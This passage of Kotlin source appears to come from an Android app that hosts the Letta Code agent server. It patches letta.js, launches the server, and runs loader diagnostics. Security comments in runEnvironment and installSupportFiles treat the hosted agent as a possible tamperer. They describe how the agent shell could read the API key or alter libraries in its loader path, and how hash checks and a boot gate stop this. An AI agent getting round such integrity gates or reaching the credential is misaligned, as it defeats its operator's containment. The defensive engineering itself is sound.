     *    denies hardlinks on app_data_file (2 sites).
     *  - Shell-shim shebang "#!/bin/sh" -> "#!/system/bin/sh" — the subagent
     *    `letta` shim is spawned via its interpreter line; /bin/sh does not
     *    exist on the Android host (1 site, template-guarded).
     *  - BashSession persistent-shell spawn "/bin/bash" -> SHELL-aware —
     *    absolute /bin/bash does not exist on the host (1 site, 0.32.x only).
     */
    private fun applyLettaJsPatches(nodeModules: File, linksHandled: Boolean = false): Int {
        val lettaJs = File(nodeModules, "@letta-ai/letta-code/letta.js")
        if (!lettaJs.exists()) {
            log("PATCH: letta.js not found")
            return 0
        }
        val s = lettaJs.readText()
        var patched = 0
        var out = s

        // --- Android link() rewrite -------------------------------------
        // DEPRECATED: fs-shim.js (NODE_OPTIONS preload) emulates link() at
        // runtime. These string rewrites CONFLICT with it — a patched site
        // writes the target with wx directly, then the shim's emulated link
        // ALSO writes it → EEXIST where the caller expected success → boot
        // crash (observed Sep 26 on watch upgrade). linksHandled=true skips
        // them all; kept only for emergency use (linksHandled=false).
        if (!linksHandled) {
        // SELinux denies hard links on app_data_file. Upstream uses the
        // write-temp-then-link atomic-publish idiom in FIVE places (0.33.x):
        //   1. publishExclusive (file-lock.ts)          — fleet-shared memory
        //      checkout locks, agent locks — KILLS EVERY BASH CALL when unpatched
        //   2. createInitializedTokenLinkSync (remote-settings-lock.ts)
        //   3. createInitializedTokenLink     (remote-settings-lock.ts)
        //   4. publishInitializedFile         (manual-instance-lock.ts)
        //   5. legacy channel-routing migration (linkSync(legacyPath, path))
        // O_EXCL create (flag:"wx") is equally atomic and Android-legal.
        //
        // Strategy: identifier-agnostic regexes so upstream renames
        // (writeFile14→writeFile17 etc.) don't silently break the patcher —
        // the OLD exact-string patches matched 0.33.2 partially and injected
        // stale identifiers from 0.31.x scopes (latent ReferenceErrors).

        // (a) Generic: writeFileN(candidate/temp, X, {flag:"wx"}) followed by
        // linkN(same, target) -> write directly to target with O_EXCL.
        Regex("""(await (?:writeFile\d+)\((\w+), ([\w.]+), \{ flag: "wx" \}\);)\s*\n(\s*)await (?:link\d*)\(\2, (\w+)\);""")
            .findAll(out).toList().let { ms ->
                for (m in ms) {
                    out = out.replaceRange(m.range,
                        "${m.groupValues[1].replace(m.groupValues[2], m.groupValues[5])} // ANDROID: link() forbidden on app storage; O_EXCL create is equally atomic\n${m.groupValues[4]}// link removed for Android")
                    patched++
                }
            }
        // (b) Sync variant: writeFileSyncN(candidate, X, {flag:"wx"}) + linkSync.
        Regex("""((?:writeFileSync\d*)\((\w+), ([\w.]+), \{ flag: "wx" \}\);)\s*\n(\s*)(?:linkSync)\(\2, (\w+)\);""")
            .findAll(out).toList().let { ms ->
                for (m in ms) {
                    out = out.replaceRange(m.range,
                        "${m.groupValues[1].replace(m.groupValues[2], m.groupValues[5])} // ANDROID: link() forbidden\n${m.groupValues[4]}// linkSync removed for Android")
                    patched++
                }
            }
        // (c) publishExclusive (file-lock.ts): writeFile3(temporaryPath, payload, "utf-8")
        //     then link(temporaryPath, path) — payload already in memory; retry
        //     as O_EXCL write, EEXIST = lock held (same semantics as link EEXIST).
        //     NOTE: raw strings need NO escaping for parens (a literal \( here
        //     broke containment matching on the first cut).
        if ("await link(temporaryPath, path8);" in out) {
            out = out.replace(
                """  try {
    await link(temporaryPath, path8);
    return true;
  } catch (error4) {
    if (error4?.code !== "EEXIST")
      throw error4;
    return false;
  } finally {""",
                """  try {
    await writeFile3(path8, payload, { flag: "wx" });
    return true;
  } catch (error4) {
    if (error4?.code !== "EEXIST")
      throw error4;
    return false;
  } finally {""")
            patched++
        }
        // (d) Legacy channel-routing migration: linkSync(legacyPath, path8) —
        //     non-locking file promotion; copy-then-unlink is fine here.
        if ("fs8.linkSync(legacyPath, path8);" in out) {
            out = out.replace(
                "fs8.linkSync(legacyPath, path8);",
                "fs8.copyFileSync(legacyPath, path8); // ANDROID: link() forbidden; copy+unlink for non-atomic migration")
            patched++
        }
        } // end if (!linksHandled)

        // --- Launcher / interpreter fixes --------------------------------
        // Memory git hooks (Sep 28): letta.js hardcodes `#!/usr/bin/env bash`
        // shebangs in its PRE/POST_COMMIT_HOOK_SCRIPT templates — regenerated
        // on every startup, so patching hook files is futile. /usr/bin/env
        // doesn't exist on Android → every commit fails with "cannot run
        // .git/hooks/pre-commit" unless --no-verify. Retarget the shebang at
        // our bash wrapper (kernel CAN exec /system/bin/sh scripts; the chain
        // wrapper → loader → glibc bash works — verified arrays + git hooks).
        // Exactly 2 occurrences in 0.33.x, both the hook templates.
        val hookShebang = "#!/usr/bin/env bash\n"
        val bashWrapper = File(filesDir, "bin/bash").absolutePath
        if (hookShebang in out) {
            out = out.replace(hookShebang, "#!$bashWrapper\n")
            patched++
        }
        if ("#!/bin/sh\nexec " in out) {
            out = out.replace("#!/bin/sh\nexec ", "#!/system/bin/sh\nexec ")
            patched++
        }
        if ("cp.spawn(\"/bin/bash\", [\"--noprofile\", \"--norc\"]" in out) {
            out = out.replace("cp.spawn(\"/bin/bash\", [\"--noprofile\", \"--norc\"]",
                "cp.spawn(process.env.SHELL || \"/bin/bash\", [\"--noprofile\", \"--norc\"]")
            patched++
        }
        if (patched > 0) {
            lettaJs.writeText(out)
            log("PATCH: applied $patched letta.js patch site(s)")
        } else {
            log("PATCH: letta.js already fully patched (or 0 sites matched)")
        }
        return patched
    }

    private fun runEnvironment() {
        // Security sink validation (Oct 8 review): refuse to launch with a
        // key or env name outside the strict shape — no matter which write
        // path stored it. The generated script interpolates envName() into a
        // single-quoted shell context; an invalid value is a launch-killer,
        // never a payload.
        if (LettaEnvironmentService.validatedKey(apiKey()) == null) {
            setStatus("invalid api key shape — reconfigure in the app")
            updateNotification("Needs valid API key")
            log("API key failed sink validation; launch blocked. Re-enter the key in the app.")
            return
        }
        if (LettaEnvironmentService.validatedEnv(envName()) == null) {
            setStatus("invalid env name — reconfigure in the app")
            updateNotification("Needs valid env name")
            log("Env name failed sink validation; launch blocked. Re-enter it in the app.")
            return
        }

        if (apiKey().isBlank()) {
            setStatus("no api key — open the app to configure")
            updateNotification("Needs API key")
            log("No API key configured; launch blocked until onboarding completes.")
            return
        }
        val rootfsDir = File(filesDir, "rootfs")
        val marker = File(filesDir, ".rootfs-extracted")
        val libDir = File(applicationInfo.nativeLibraryDir)
        val libLoader = File(libDir, "libldlnx.so")

        // Self-heal: corrupted earlier extraction leaves marker but incomplete rootfs.
        if (marker.exists() && !File(rootfsDir, "usr/local/bin/node").exists()) {
            log("marker exists but node missing — rootfs incomplete, re-extracting")
            marker.delete()
            rootfsDir.deleteRecursively()
        }

        if (!marker.exists()) {
            setStatus("extracting rootfs (first run)")
            log("Extracting rootfs...")
            rootfsDir.mkdirs()
            val assetCopy = File(cacheDir, "rootfs.tgz")
            assets.open("rootfs.tar").use { input ->
                assetCopy.outputStream().use { output -> input.copyTo(output, 1 shl 20) }
            }
            val tar = ProcessBuilder("tar", "-xzf", assetCopy.absolutePath, "-C", rootfsDir.absolutePath)
                .redirectErrorStream(true)
                .start()
            var tarErrLines = 0
            tar.inputStream.bufferedReader().forEachLine {
                tarErrLines++
                if (tarErrLines <= 20) log("tar: $it")
            }
            val tarExit = tar.waitFor()
            if (tarExit != 0) {
                // toybox tar skips /etc/alternatives absolute symlinks and exits 1 — tolerate
                log("tar exited $tarExit ($tarErrLines warning lines) — tolerating")
            }
            assetCopy.delete()
            if (!File(rootfsDir, "usr/local/bin/node").exists()) {
                rootfsDir.deleteRecursively()
                setStatus("failed: rootfs extraction incomplete")
                updateNotification("Extraction failed")
                log("Extraction verification failed — node missing after tar")
                return
            }
            marker.createNewFile()
            log("Rootfs extracted.")
        }

        if (!libLoader.exists()) {
            setStatus("failed: native lib dir missing loader (${libDir.absolutePath})")
            log("FATAL: $libLoader not found — APK injection missing?")
            return
        }

        installSupportFiles(rootfsDir, libDir)
        sweepStaleListenerLocks(rootfsDir)

        // SECURITY BOOT GATE (Oct 8 set 2 / review 2731): files/libs is in
        // the loader search path AND agent-writable. installSupportFiles just
        // verify-restored every manifest entry from APK authority, so this
        // gate runs AFTER it — anything still wrong here was written between
        // the restore pass and this moment (active in-session tampering), or
        // the restore itself failed. Expected set DERIVES from the manifest
        // (no hand-copied literal): foreign file → delete + block; required
        // entry missing → block (restore failed); present-but-hash-mismatch
        // → block. OPTIONAL entries (verify-if-present) tolerate absence.
        val gateVerdict = integrityGate()
        if (gateVerdict != null) {
            setStatus(gateVerdict.first)
            updateNotification(gateVerdict.second)
            log("SECURITY: ${gateVerdict.third} Launch blocked.")
            return
        }

        // letta.js PRE-PATCH pin (Oct 8 set-3 follow-up): verify the member
        // bytes BEFORE any patching rewrites the file (gate-then-patch). On
        // pinned-version installs a wrong/missing letta.js is restored from
        // the rootfs.tar authority; unrestorable → block boot.
        val manifestTextForPin = runCatching {
            assets.open("integrity-manifest.txt").bufferedReader().use { it.readText() }
        }.getOrDefault("")
        if (!verifyLettaJsPin(rootfsDir, manifestTextForPin)) {
            setStatus("failed: letta.js integrity")
            updateNotification("Integrity: letta.js")
            log("SECURITY: letta.js pre-patch pin failed — Launch blocked.")
            return
        }

        // Re-apply letta.js patches on every start: npm-upgraded installs
        // (upgrade button) land unpatched until the NEXT upgrade, and the
        // launcher/interpreter fixes are load-bearing for the Bash tool.
        // fs-shim handles link() at runtime; on fresh installs skip the
        // link-string patches entirely (they conflict — see upgrade path).
        val startApplied = applyLettaJsPatches(File(rootfsDir, "usr/local/lib/node_modules"), linksHandled = true)
        if (startApplied == 0) {
            // Fail-closed ONLY when the pin just verified authority bytes
            // (unpatched by construction) — 0 sites there means the patcher
            // no longer matches upstream, which would brick Bash/hooks.
            // Upgraded installs (pin not applied) keep warning-only: 0 can
            // mean "already patched by a previous boot".
            val pinWasApplied = runCatching {
                val installedV = org.json.JSONObject(
                    File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/package.json").readText()
                ).optString("version", "")
                installedV == parseManifestPinVersion(manifestTextForPin)
            }.getOrDefault(false)
            if (pinWasApplied) {
                log("SECURITY: 0 patch sites after pin-verified authority restore — patcher broken vs upstream. Blocking boot.")
                setStatus("failed: letta.js patch")
                updateNotification("Patch failed")
                return
            }
            log("PATCH: 0 sites on unpinned (upgraded) install — warning only")
        }

        val libPath = libDir.absolutePath
        val lettaJs = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/letta.js").absolutePath

        runDiagnostics(libDir, rootfsDir)
        writeAgentReadme(rootfsDir)

        setStatus("starting letta server")
        log("Launching letta server (env: ${envName()}, libdir: $libPath)...")

        val dnsShim = File(filesDir, "dns-shim.js").absolutePath
        val bashDir = File(filesDir, "bin")

        val filesLibs = File(filesDir, "libs")
        val combinedPath = libPath + ":" + filesLibs.absolutePath
        // Launch via a script that mirrors the PROVEN adb test invocation:
        // shell-redirected stdio (> log 2>&1 < /dev/null) avoids node's
        // uv__close(fd<=2) assertion with Java ProcessBuilder fd plumbing.
        val launchScript = File(filesDir, "launch-server.sh")
        launchScript.writeText(
            "#!/system/bin/sh\n" +
            "cd ${filesDir.absolutePath}\n" +
            "export HOME=${File(rootfsDir, "root").absolutePath}\n" +
            "export TMPDIR=${File(rootfsDir, "tmp").absolutePath}\n" +
            "export PATH=${bashDir.absolutePath}:/system/bin:/system/xbin\n" +
            // SHELL: letta.js launcher resolution (selectAvailableShellLauncher /
            // unixLaunchers) tries process.env.SHELL FIRST; without it the first
            // candidate is an absolute "/bin/bash" that does not exist on the
            // Android host and non-win32 selection returns launchers[0] with no
            // fallback — every Bash tool call dies with ENOENT. Point SHELL at
            // the files/bin/bash wrapper (Debian bash via the libdir loader chain).
            "export SHELL=${bashDir.absolutePath}/bash\n" +
            // LETTA_CODE_BIN: subagent spawning (resolveSubagentLauncher →
            // resolveLettaInvocation) prefers this explicit binary; the defaults
            // would otherwise try to re-exec process.execPath (libnode.so via the
            // loader chain — cannot be re-spawned raw) or execute letta.js as a
            // program (ENOEXEC on Android). The wrapper lives in files/bin/letta.
            "export LETTA_CODE_BIN=${bashDir.absolutePath}/letta\n" +
            "export TERM=dumb\n" +
            "export LD_LIBRARY_PATH=$combinedPath\n" +
            "export NODE_OPTIONS=\"--require ${File(filesDir, "fs-shim.js").absolutePath} --require ${File(filesDir, "dns-shim.js").absolutePath}\"\n" +
            "export UV_USE_IO_URING=0\n" +
            // DNS forwarder for the glibc git ELF chain (Sep 28): dnsport.so
            // (LD_PRELOAD getaddrinfo override inside git-elf) sends raw DNS
            // to 127.0.0.1:15353; this node forwarder relays to public
            // resolvers. Must launch via the APK loader path (uv__close assert
            // otherwise) with setsid (dies with the adb shell otherwise).
            // Port check makes it idempotent across restarts. NODE_OPTIONS is
            // unset for the forwarder: fs-shim/dns-shim are for the letta
            // server process, and dns-shim (c-ares setServers) breaks the
            // forwarder's own dgram binds (empirically — it dies at launch
            // with the shims preloaded).
            "OLDNO=\$NODE_OPTIONS; unset NODE_OPTIONS\n" +
            "if ! netstat -an 2>/dev/null | grep -q 127.0.0.1:15353; then\n" +
            "  setsid nohup ${libLoader.absolutePath} --library-path $combinedPath ${File(libDir, "libnode.so").absolutePath} ${File(filesDir, "dns-forwarder.js").absolutePath} > ${File(filesDir, "dns-forwarder.log").absolutePath} 2>&1 < /dev/null &\n" +
            "fi\n" +
            "export NODE_OPTIONS=\$OLDNO\n" +
            "exec ${libLoader.absolutePath} --library-path $combinedPath ${File(libDir, "libnode.so").absolutePath} $lettaJs server --env-name '${envName()}' --debug > ${File(filesDir, "server-stdout.log").absolutePath} 2>&1 < /dev/null\n"
        )
        val stdinFile = File(filesDir, "stdin.txt")
        if (!stdinFile.exists()) stdinFile.writeText("")
        launchScript.setExecutable(true, false)

        val pb = ProcessBuilder(launchScript.absolutePath)

        // Snapshot the config this server launches with: re-key / rename while
        // running must trigger a restart (configChanged), not a silent ignore.
        // Security (Oct 8 review): the key no longer lives on disk here —
        // agent-readable files must not hold credentials. Config-change
        // detection uses the env name + key fingerprint (first 8 chars of
        // a hash — enough to detect re-key, reveals nothing).
        val keyFp = java.security.MessageDigest.getInstance("SHA-256")
            .digest(apiKey().toByteArray()).take(4).joinToString("") { "%02x".format(it) }
        File(filesDir, ".launch-config").writeText("${keyFp}\n${envName()}")

        // Security (Oct 8 review): the API key reaches the server through
        // the process environment — NOT through the generated script, whose
        // file is readable by the agent shell (one `cat` away from exfil).
        // ProcessBuilder env vars live in the kernel's copy of this process's
        // env; the script file on disk never contains the credential.
        pb.environment()["LETTA_API_KEY"] = apiKey()
        val p = pb.start()
        proc = p
        lifecycle.set(State.RUNNING)
        // Review #18 F1 (Angus): an Upgrade/Restart intent that arrived during
        // STARTING saw proc == null — its destroy() was a no-op and the op sat
        // pending until the next natural exit (hours later). Re-check NOW that
        // the process exists, so the pending op takes effect immediately.
        if (pendingOp.get() != null && pendingOp.get() != PendingOp.SHUTDOWN) {
            log("pending operation present at launch — stopping server to drain it")
            try { p.destroy() } catch (_: Exception) {}
        }
        log("Process started, streaming output (via server-stdout.log)...")

        // Output goes to a file (valid fd for the child); tail it for status.
        // NOTE: tailer binds to THIS process (local val) — the old loop read
        // the shared `proc` var, so an upgrade's proc=null left the stale
        // tailer alive forever, double-appending once the new launch truncated
        // server-stdout.log past its offset (review task_93 #9).
        val outLogFile = java.io.File(filesDir, "server-stdout.log")

        // Cloud-connection watchdog: the server can be process-alive while its
        // cloud WebSocket is half-dead (killed socket, stale registration —
        // observed Sep 25: local traffic flowed, cloud said disconnected, app
        // unselectable as environment). Signal: server-stdout.log stops growing
        // while RUNNING. The letta server logs at least one lifecycle line per
        // ~30s (pong/recv) when healthy; silence past SILENCE_LIMIT = dead link.
        // Remedy: destroy the process; the worker's pending-RESTART loop
        // relaunches fresh and re-registers.
        val watchdog = Thread {
            val silenceLimitMs = 5 * 60_000L
            var quietMs = 0L
            while (p.isAlive && pendingOp.get() == null) {
                Thread.sleep(30_000)
                val lastWrite = outLogFile.lastModified()
                quietMs = if (lastWrite == 0L) quietMs + 30_000 else System.currentTimeMillis() - lastWrite
                if (quietMs >= silenceLimitMs) {
                    log("WATCHDOG: server silent ${quietMs / 1000}s while running — cloud link presumed dead; restarting")
                    setStatus("restarting — cloud connection silent")
                    pendingOp.compareAndSet(null, PendingOp.RESTART)
                    try { p.destroy() } catch (_: Exception) {}
                    return@Thread
                }
            }
        }
        watchdog.isDaemon = true
        watchdog.start()

        // Output goes to a file (valid fd for the child); tail it for status.
        // NOTE: tailer binds to THIS process (local val) — the old loop read
        // the shared `proc` var, so an upgrade's proc=null left the stale
        // tailer alive forever, double-appending once the new launch truncated
        // server-stdout.log past its offset (review task_93 #9).
        val tailer = Thread {
            var pos = 0L
            while (p.isAlive) {
                try {
                    if (outLogFile.length() > pos) {
                        java.io.RandomAccessFile(outLogFile, "r").use { raf ->
                            raf.seek(pos)
                            var line = raf.readLine()
                            while (line != null) {
                                log(line)
                                classifyRegistrationLine(line)?.let { rs ->
                                    setStatus(rs.status)
                                    updateNotification(rs.notification ?: "Online — ${envName()}")
                                }
                                pos = raf.filePointer
                                line = raf.readLine()
                            }
                        }
                    }
                } catch (_: Exception) {}
                Thread.sleep(500)
            }
        }
        tailer.isDaemon = true
        tailer.start()

        val code = p.waitFor()
        log("letta server exited: $code")
        // Don't overwrite a pending-op status ("stopping for upgrade") with a
        // bare exit code the worker is about to supersede; label user-initiated
        // stops distinctly from crashes (review task_93 #5, partially).
        if (pendingOp.get() != null) {
            log("exit $code superseded by pending operation")
        } else {
            // Auth-rejection beats the bare exit code (audit fix 6): when the
            // registration output flagged a rejected key, "exited: N" is
            // misleading — the fix is a new key, not a reinstall/restart loop.
            val statusFile = File(filesDir, "status.txt")
            val rejectedKey = runCatching { statusFile.readText() }
                .getOrDefault("")
                .contains("key rejected by Letta Cloud")
            if (rejectedKey) {
                log("exit $code attributed to rejected API key")
                updateNotification("Key rejected by Letta Cloud")
            } else if (code >= 128) {
                setStatus("crashed (signal ${code - 128})")
                updateNotification("Crashed — exit $code")
            } else {
                setStatus("exited: $code")
                updateNotification("Stopped (exit $code)")
            }
        }
    }

    /** In-process mmap-exec matrix: can the ART runtime dlopen exec-mapped files? */
    private fun inProcessMapTests(libDir: File) {
        try {
            System.load(File(libDir, "libzerodep.so").absolutePath)
            log("DIAG sysload-libdir: OK (in-process dlopen of apk lib works)")
        } catch (t: Throwable) {
            log("DIAG sysload-libdir: FAIL ${t.message}")
        }
        try {
            val dataCopy = File(filesDir, "libzerodep-data.so")
            if (!dataCopy.exists()) {
                File(libDir, "libzerodep.so").inputStream().use { input ->
                    dataCopy.outputStream().use { input.copyTo(it) }
                }
            }
            System.load(dataCopy.absolutePath)
            log("DIAG sysload-appdata: OK (in-process dlopen of app_data works)")
        } catch (t: Throwable) {
            log("DIAG sysload-appdata: FAIL ${t.message}")
        }
    }

    /**
     * Staged verification + forensics:
     *   sig-sys / sig-segv  → verify Java exit-value encoding is 128+signal
     *   libdir-true/node    → loader chain sanity
     *   *-catch variants    → LD_PRELOAD SIGSYS catcher prints the trapped
     *                         syscall number (si_syscall) if death occurs
     *                         after preload constructors run
     */
    private fun runDiagnostics(libDir: File, rootfsDir: File) {
        val loader = File(libDir, "libldlnx.so").absolutePath
        val libPath = libDir.absolutePath + ":" + File(filesDir, "libs").absolutePath
        val sigsys = File(libDir, "libsigsys.so").absolutePath
        inProcessMapTests(libDir)
        // auxv dumper: what does the kernel tell this process about its CPU?
        try {
            val auxvBin = File(filesDir, "auxv")
            if (!auxvBin.exists()) {
                assets.open("diag-auxv").use { input -> auxvBin.outputStream().use { input.copyTo(it) } }
                auxvBin.setExecutable(true, false)
            }
            val pa = ProcessBuilder(auxvBin.absolutePath).redirectErrorStream(true).start()
            val ao = pa.inputStream.bufferedReader().readText()
            pa.waitFor()
            log("DIAG auxv: ${ao.replace("\n", " | ").take(400)}")
        } catch (e: Exception) { log("DIAG auxv: FAIL ${e.message}") }
        // strace-lite: ptrace the dying chain, capture every syscall nr
        try {
            val stl = File(filesDir, "stracelite")
            if (!stl.exists()) {
                assets.open("diag-stracelite").use { input -> stl.outputStream().use { input.copyTo(it) } }
                stl.setExecutable(true, false)
            }
            val rl = File(rootfsDir, "lib/aarch64-linux-gnu/ld-linux-aarch64.so.1").absolutePath
            val lp = File(rootfsDir, "lib/aarch64-linux-gnu").absolutePath + ":" + File(rootfsDir, "usr/lib/aarch64-linux-gnu").absolutePath
            val tb = File(rootfsDir, "usr/bin/true").absolutePath
            val lettaJsP = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/letta.js").absolutePath
            val pb3 = ProcessBuilder(stl.absolutePath, File(libDir, "libldlnx.so").absolutePath, "--library-path", libDir.absolutePath + ":" + File(filesDir, "libs").absolutePath, File(libDir, "libnode.so").absolutePath, lettaJsP, "server", "--env-name", envName()).redirectErrorStream(true)
            pb3.environment()["NODE_OPTIONS"] = "--require " + File(filesDir, "fs-shim.js").absolutePath + " --require " + File(filesDir, "dns-shim.js").absolutePath
            pb3.environment()["LETTA_API_KEY"] = apiKey()
            pb3.environment()["HOME"] = File(rootfsDir, "root").absolutePath
            pb3.environment()["TMPDIR"] = File(rootfsDir, "tmp").absolutePath
            pb3.environment()["PATH"] = File(filesDir, "bin").absolutePath + ":/system/bin:/system/xbin"
            pb3.environment().clear()
            val p3 = pb3.start()
            val o3 = StringBuilder()
            val r3 = Thread { try { p3.inputStream.bufferedReader().forEachLine { o3.appendLine(it) } } catch (_: Exception) {} }
            r3.isDaemon = true; r3.start()
            val fin3 = p3.waitFor(15, TimeUnit.SECONDS)
            if (!fin3) { p3.destroyForcibly(); log("DIAG stracelite: TIMEOUT") }
            else {
                val f3 = o3.toString()
                File(filesDir, "diag-stracelite.txt").writeText(f3)
                log("DIAG stracelite: exit=${p3.exitValue()} lines=${f3.lines().size} last10='${f3.trim().lines().takeLast(10).joinToString(" | ")}'")
            }
        } catch (e: Exception) { log("DIAG stracelite: FAIL ${e.message}") }
        // env-clean glibc chain: does clearing the inherited Zygote env fix it?
        try {
            val pb2 = ProcessBuilder(File(rootfsDir, "lib/aarch64-linux-gnu/ld-linux-aarch64.so.1").absolutePath, "--library-path", File(rootfsDir, "lib/aarch64-linux-gnu").absolutePath + ":" + File(rootfsDir, "usr/lib/aarch64-linux-gnu").absolutePath, File(rootfsDir, "usr/bin/true").absolutePath).redirectErrorStream(true)
            pb2.environment().clear()
            pb2.environment()["LD_DEBUG"] = "all"
            val p2 = pb2.start()
            val o2 = StringBuilder()
            val r2 = Thread { try { p2.inputStream.bufferedReader().forEachLine { o2.appendLine(it) } } catch (_: Exception) {} }
            r2.isDaemon = true; r2.start()
            val fin = p2.waitFor(10, TimeUnit.SECONDS)
            if (!fin) { p2.destroyForcibly(); log("DIAG envclean-true: TIMEOUT") }
            else {
                val f2 = o2.toString()
                File(filesDir, "diag-envclean.txt").writeText(f2)
                log("DIAG envclean-true: exit=${p2.exitValue()} len=${f2.length} tail='${f2.trim().takeLast(150)}'")
            }
        } catch (e: Exception) { log("DIAG envclean-true: FAIL ${e.message}") }
        data class T(val name: String, val cmd: List<String>, val env: Map<String, String> = emptyMap())
        val tests = listOf(
            T("sig-sys", listOf("/system/bin/sh", "-c", "kill -SYS \$\$")),
            T("sig-segv", listOf("/system/bin/sh", "-c", "kill -SEGV \$\$")),
            T("exit159", listOf("/system/bin/sh", "-c", "exit 159")),
            T("libdir-true", listOf(loader, "--library-path", libPath, File(libDir, "libtrue.so").absolutePath)),
            T("libdir-true-catch", listOf(loader, "--library-path", libPath, File(libDir, "libtrue.so").absolutePath), mapOf("LD_PRELOAD" to sigsys)),
            T("libdir-true-debug", listOf(loader, "--library-path", libPath, File(libDir, "libtrue.so").absolutePath), mapOf("LD_DEBUG" to "all")),
            T("rootfs-orig-debug", listOf(File(rootfsDir, "lib/aarch64-linux-gnu/ld-linux-aarch64.so.1").absolutePath, "--library-path", File(rootfsDir, "lib/aarch64-linux-gnu").absolutePath + ":" + File(rootfsDir, "usr/lib/aarch64-linux-gnu").absolutePath, File(rootfsDir, "usr/bin/true").absolutePath), mapOf("LD_DEBUG" to "all")),
            T("libdir-node-catch", listOf(loader, "--library-path", libPath, File(libDir, "libnode.so").absolutePath, "--version"), mapOf("LD_PRELOAD" to sigsys))
        )
        for (t in tests) {
            try {
                val pb = ProcessBuilder(t.cmd).redirectErrorStream(true)
                pb.environment().putAll(t.env)
                val p = pb.start()
                val out = StringBuilder()
                val reader = Thread { try { p.inputStream.bufferedReader().forEachLine { out.appendLine(it) } } catch (_: Exception) {} }
                reader.isDaemon = true
                reader.start()
                val finished = p.waitFor(10, TimeUnit.SECONDS)
                if (!finished) {
                    p.destroyForcibly()
                    log("DIAG ${t.name}: TIMEOUT (killed)")
                    continue
                }
                val full = out.toString()
                if (t.name.endsWith("debug")) {
                    File(filesDir, "diag-" + t.name + ".txt").writeText(full)
                }
                log("DIAG ${t.name}: exit=${p.exitValue()} len=${full.length} tail='${full.trim().takeLast(200)}'")
            } catch (e: Exception) {
                log("DIAG ${t.name}: ${e.javaClass.simpleName}: ${e.message}")
            }
        }
    }

    /**
     * Runtime wiring that depends on the per-install libdir path:
     *  - files/bin/bash      → wrapper chaining into libdir Debian bash
     *  - native addons       → symlinks from node_modules into libdir
     *  - files/dns-shim.js   → copied from assets
     */
    private fun installSupportFiles(rootfsDir: File, libDir: File) {
        val filesLibs = File(filesDir, "libs")
        val libPath = libDir.absolutePath + ":" + filesLibs.absolutePath
        val loaderFlag = "${File(libDir, "libldlnx.so").absolutePath} --library-path $libPath"

        // Security (review 2731, PR #118): APK-asset sha256 manifest is the
        // single integrity authority for everything agent-writable that the
        // server loads (glibc libs + native addons in the loader path, the
        // two NODE_OPTIONS preload shims, dnsport.so). The rootfs copy of a
        // lib is UNTRUSTED CACHE — restore bytes come from immutable APK
        // sources: the named asset, or a member of the APK's pinned
        // rootfs.tar asset. This closes both review blockers: length-only
        // addon compare (now full sha256) and the laundering path (rootfs
        // was the "trusted" restore source while itself agent-writable).
        val manifest = readIntegrityManifest()
        if (manifest.isEmpty()) {
            log("SECURITY: integrity manifest missing/unparseable in APK assets — " +
                "build defect. Files populated with legacy semantics; boot gate will block.")
        }
        filesLibs.mkdirs()
        var manifestRestores = 0
        // Single rootfs.tar scan: collect ALL rootfs-sourced entries needing
        // authority restore and extract them in ONE pass over the asset —
        // per-entry scans would re-decompress the 194MB tarball per file.
        val tarRestores = LinkedHashMap<File, String>() // dst -> member
        for (e in manifest) {
            // npm/ entries (letta.js pin) are NOT filesDir-relative installs:
            // the pin check owns that file (see verifyLettaJsPin) — the
            // generic loop would copy it to the wrong location.
            if (e.dest.startsWith("npm/")) continue
            val dst = File(filesDir, e.dest)
            dst.parentFile?.mkdirs()
            // Healthy cache: bytes already match authority — leave untouched.
            if (dst.exists() && sha256Of(dst) == e.sha256) continue
            val existed = dst.exists()
            when {
                e.source.startsWith("asset:") -> {
                    val name = e.source.removePrefix("asset:")
                    assets.open(name).use { input ->
                        dst.outputStream().use { output -> input.copyTo(output, 1 shl 16) }
                    }
                    log("integrity: ${e.dest} ${if (existed) "rewritten" else "installed"} from APK asset $name")
                    manifestRestores++
                }
                e.source.startsWith("rootfs:") -> {
                    val rpath = e.source.removePrefix("rootfs:")
                    val untrusted = File(rootfsDir, rpath)
                    // Write-cache from the rootfs copy ONLY when it already
                    // matches the manifest — otherwise it is not authority.
                    val untrustedOk = untrusted.exists() && sha256Of(untrusted) == e.sha256
                    val member = "./" + (e.member ?: rpath)
                    // Authority restore: ALWAYS prefer the tar member over the
                    // untrusted rootfs cache when the cache doesn't match.
                    if (untrustedOk) {
                        untrusted.copyTo(dst, overwrite = true)
                        log("integrity: ${e.dest} written from hash-verified rootfs cache")
                        manifestRestores++
                    } else {
                        tarRestores[dst] = member
                    }
                }
            }
        }
        if (tarRestores.isNotEmpty()) {
            val results = extractRootfsTarMembers(tarRestores)
            for ((dst, ok) in results) {
                val member = tarRestores[dst]
                if (ok) {
                    log("integrity: ${dst.name} restored from rootfs.tar member $member")
                    manifestRestores++
                } else {
                    // Member absent from THIS build's tar (e.g. optional sharp
                    // addons on the pre-swap rootfs) AND no matching untrusted
                    // cache: required entries will block at the gate; optional
                    // entries simply stay absent. Never leave wrong bytes in
                    // the loader path — delete rather than keep tampered.
                    if (dst.exists()) {
                        dst.delete()
                        log("integrity: ${dst.name} unrestorable (tar member $member not in build) and failed manifest — deleted from loader path")
                    }
                }
            }
        }
        if (manifest.isNotEmpty()) {
            log("integrity manifest: ${manifest.size} entries, $manifestRestores (re)written")
        }

        // Legacy fallback (manifest empty = build defect): original-name
        // glibc libs copied from rootfs so a malformed build still boots
        // far enough to show its error. The boot gate still blocks launch.
        val nmRoot0 = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/node_modules")
        if (manifest.isEmpty()) {
            for (dir in listOf(File(rootfsDir, "lib/aarch64-linux-gnu"), File(rootfsDir, "usr/lib/aarch64-linux-gnu"))) {
                for (n in listOf("libc.so.6", "libm.so.6", "libdl.so.2", "libpthread.so.0", "libgcc_s.so.1", "libstdc++.so.6", "libtinfo.so.6", "libresolv.so.2")) {
                    val src = File(dir, n)
                    val dst = File(filesLibs, n)
                    if (src.exists() && !dst.exists()) src.copyTo(dst)
                }
            }
            for (a in listOf(
                File(nmRoot0, "node-pty/build/Release/pty.node"),
                File(nmRoot0, "@img/sharp-linux-arm64/lib/sharp-linux-arm64.node"),
                File(nmRoot0, "@img/sharp-libvips-linux-arm64/lib/libvips-cpp.so.8.17.3")
            )) {
                if (a.exists() && !File(filesLibs, a.name).exists()) a.copyTo(File(filesLibs, a.name))
            }
        }
        // dns-shim.js / fs-shim.js / libs/dnsport.so are no longer written
